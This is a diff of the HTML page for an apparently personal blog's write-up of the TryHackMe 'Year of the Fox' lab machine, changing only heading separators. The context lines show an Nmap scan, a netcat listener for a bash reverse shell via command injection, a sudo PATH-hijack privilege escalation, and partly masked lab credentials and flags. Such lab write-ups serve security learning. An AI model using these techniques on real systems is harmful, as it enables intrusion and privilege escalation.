@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20200625_htb-bashed.html"> « </a>📅 published on <code>30/Jul/2020</code><a href="/posts/20200810_vulnhub-infosecpreposcp.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#tryhackme>tryhackme</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for TryHackMe VM <a href="https://tryhackme.com/room/yotf">Year of the Fox</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_thm_yotf/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_thm_yotf/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.29</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_command_injection">exploit_command_injection</a>, <a href="https://github.com/7h3rAm/writeups#privesc_env_relative_path">privesc_env_relative_path</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.80 scan initiated Wed Jul 29 19:54:07 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/xml/_quick_tcp_nmap.xml 10.10.41.240
 Increasing send delay for 10.10.41.240 from 0 to 5 due to 25 out of 82 dropped probes since last increase.
@@ -173,7 +173,7 @@ enum4linux complete on Wed Jul 29 20:18:34 2020
 <pre class="nested"><code>ssh: rascal, fox
 webapp: rascal
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We further leverage the command execution vulnerability to get interactive access on the target machine. For this, we first start a local netcat listener and use a bash reverse shell:  </p>
 <pre class="nested"><code>nc -nlvp 4433
 
@@ -205,7 +205,7 @@ ssh fox@10.10.41.240 -p1337
 <p class="nested"><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_thm_yotf/screenshot11.png.webp" />  </p>
 <p class="nested">4. We find the second flag file <code>/home/fox/user-flag.txt</code>:  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_thm_yotf/screenshot12.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www-data@year-of-the-fox&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@year-of-the-fox&gt;  
@@ -236,7 +236,7 @@ rascal
 fox
 root
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We find that we can execute the <code>/usr/sbin/shutdown</code> file with <code>sudo</code>. Since the target machine doesn't have <code>strings</code> installed, we transfer this file to our attacking machine and investigate further. We find a reference to the <code>poweroff</code> binary name, which when combined with the fact that <code>secure_path</code> is not defined within <code>/etc/sudoers</code> (seen in <code>sudo -l</code> output), hint that a environment path modification vector could help us escalate privileges:  </p>
 <p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_thm_yotf/screenshot13.png.webp" />  </p>
 <p class="nested">2. We copy bash to the local directory, rename it to <code>poweroff</code> and modify the <code>PATH</code> environment variable to search for file within current directory first. With this change, we then execute <code>shutdown</code> file and get elevated privileges:  </p>
@@ -253,12 +253,12 @@ sudo /usr/sbin/shutdown
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_thm_yotf/screenshot16.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_thm_yotf/screenshot17.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Learning/Recommendation</h2>
 <ul class="nested">
 <li>The webapp exposed a search field which was vulnerable to command injection. This allowed the attacker to gain interactive access of the target machine. It is advised to follow a secure development lifecycle for critical production web applications.</li>
 <li>The <code>shutdown</code> binary was vulnerable to a path expansion attack which allowed the attacker to gain elevated privileges.</li>
 </ul>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
 <pre class="nested"><code>ssh: fox/1234...
 webapp: rascal/l...
@@ -268,7 +268,7 @@ webapp: rascal/l...
 /home/fox/user-flag.txt: THM{Njg3NWZhNDBjMmNlMzNkM............
 /home/rascal/.did-you-think-I-was-useless.root: THM{ODM3NTdkMDljYmM4.................
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://tryhackme.com/room/yotf">https://tryhackme.com/room/yotf</a>  </li>
 <li><a href="https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/">https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/</a>  </li>
